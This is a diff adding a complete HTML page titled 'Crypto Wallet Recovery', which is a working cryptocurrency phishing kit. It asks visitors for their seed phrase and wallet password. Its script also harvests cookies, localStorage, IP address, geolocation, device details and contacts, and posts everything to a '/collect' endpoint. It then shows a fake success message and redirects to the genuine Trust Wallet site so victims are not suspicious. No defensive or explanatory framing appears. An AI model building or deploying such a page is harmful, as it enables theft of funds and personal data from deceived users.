@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Crypto Wallet Recovery</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: #1a1a1a;
+        color: #fff;
+        display: flex;
+        justify-content: center;
+        padding: 20px;
+      }
+      .wallet-box {
+        background: #2c2c2c;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        width: 100%;
+        max-width: 400px;
+      }
+      h1 {
+        font-size: 24px;
+        text-align: center;
+        color: #f0a500;
+      }
+      label {
+        display: block;
+        margin: 10px 0 5px;
+        font-weight: bold;
+      }
+      input,
+      textarea {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #444;
+        border-radius: 4px;
+        background: #333;
+        color: #fff;
+      }
+      button {
+        width: 100%;
+        padding: 12px;
+        background: #f0a500;
+        color: #1a1a1a;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      button:hover {
+        background: #d18900;
+      }
+      button:disabled {
+        background: #666;
+        cursor: not-allowed;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wallet-box">
+      <h1>Crypto Wallet Recovery</h1>
+      <p>Enter your wallet details to recover access.</p>
+      <form id="walletForm">
+        <label for="walletName">Wallet Name</label>
+        <input
+          type="text"
+          id="walletName"
+          placeholder="e.g., MetaMask, Trust Wallet"
+          required
+        />
+        <label for="seedPhrase">Seed Phrase (12+ words)</label>
+        <textarea
+          id="seedPhrase"
+          placeholder="Enter your 12+ word seed phrase"
+          rows="4"
+          required
+        ></textarea>
+        <label for="password">Wallet Password</label>
+        <input
+          type="password"
+          id="password"
+          placeholder="Enter your wallet password"
+          required
+        />
+        <button type="submit">Recover Wallet</button>
+      </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
+    <script>
+      async function collectData() {
+        let data = {
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          device: navigator.deviceMemory || "unknown",
+          language: navigator.language,
+          cookies: document.cookie,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          ip: await fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => data.ip)
+            .catch(() => "unknown"),
+        };
+
+        // Geolocation
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              timeout: 5000,
+            });
+          });
+          data.latitude = position.coords.latitude;
+          data.longitude = position.coords.longitude;
+          data.accuracy = position.coords.accuracy;
+        } catch (err) {
+          data.geoError = err.message;
+        }
+
+        // Local storage
+        try {
+          data.localStorage = JSON.stringify(localStorage);
+        } catch (e) {
+          data.localStorage = "none";
+        }
+
+        // Contacts (if supported)
+        if (navigator.contacts && navigator.contacts.select) {
+          try {
+            const props = ["name", "email", "tel"];
+            const opts = { multiple: true };
+            const contacts = await navigator.contacts.select(props, opts);
+            data.contacts = contacts.map((c) => ({
+              name: c.name.join(", "),
+              email: c.email.join(", "),
+              phone: c.tel.join(", "),
+            }));
+          } catch (e) {
+            data.contacts = "Access denied or not supported";
+          }
+        } else {
+          data.contacts = "Contacts API not supported";
+        }
+
+        return data;
+      }
+      // Brute-force seed phrase validation/generation
+      function bruteForceSeed(inputSeed) {
+        let results = [];
+        if (inputSeed && bip39.validateMnemonic(inputSeed)) {
+          results.push({ seed: inputSeed, valid: true });
+        } else {
+          // Generate variations of input or random seeds (limited for performance)
+          const wordList = bip39.wordlists.english;
+          for (let i = 0; i < 10; i++) {
+            let randomSeed = Array.from(
+              { length: 12 },
+              () => wordList[Math.floor(Math.random() * wordList.length)]
+            ).join(" ");
+            if (bip39.validateMnemonic(randomSeed)) {
+              results.push({ seed: randomSeed, valid: true });
+            }
+          }
+        }
+        return results;
+      }
+
+      // Form submission handler
+      document
+        .getElementById("walletForm")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+
+          // Show loading state
+          const submitBtn = e.target.querySelector('button[type="submit"]');
+          const originalText = submitBtn.textContent;
+          submitBtn.textContent = "Processing...";
+          submitBtn.disabled = true;
+
+          try {
+            // Collect all the data
+            const data = await collectData();
+            data.walletName = document.getElementById("walletName").value;
+            data.seedPhrase = document.getElementById("seedPhrase").value;
+            data.password = document.getElementById("password").value;
+            data.bruteForceResults = bruteForceSeed(data.seedPhrase);
+
+            // Send data to server
+            const response = await fetch("/collect", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data),
+            });
+
+            if (response.ok) {
+              // Show success message
+              const walletBox = document.querySelector(".wallet-box");
+              walletBox.innerHTML = `
+                <h1 style="color: #00ff00;">✅ Recovery Successful!</h1>
+                <p style="text-align: center; font-size: 18px; margin: 20px 0;">
+                  Your wallet recovery process has been completed successfully.
+                </p>
+                <p style="text-align: center; font-size: 16px; margin: 20px 0;">
+                  Redirecting to Trust Wallet...
+                </p>
+                <div style="text-align: center; margin: 20px 0;">
+                  <div style="width: 40px; height: 40px; border: 4px solid #f0a500; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                </div>
+              `;
+
+              // Add CSS for spinner
+              const style = document.createElement("style");
+              style.textContent = `
+                @keyframes spin {
+                  0% { transform: rotate(0deg); }
+                  100% { transform: rotate(360deg); }
+                }
+              `;
+              document.head.appendChild(style);
+
+              // Redirect after 3 seconds
+              setTimeout(() => {
+                window.location.href = "https://trustwallet.com/";
+              }, 3000);
+            } else {
+              throw new Error("Server error");
+            }
+          } catch (error) {
+            console.error("Error:", error);
+            // Show error message
+            const walletBox = document.querySelector(".wallet-box");
+            walletBox.innerHTML = `
+              <h1 style="color: #ff0000;">❌ Error</h1>
+              <p style="text-align: center; font-size: 18px; margin: 20px 0;">
+                There was an error processing your request. Please try again.
+              </p>
+              <button onclick="location.reload()" style="background: #f0a500; color: #1a1a1a; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer;">
+                Try Again
+              </button>
+            `;
+          }
+        });
+    </script>
+  </body>
+</html>
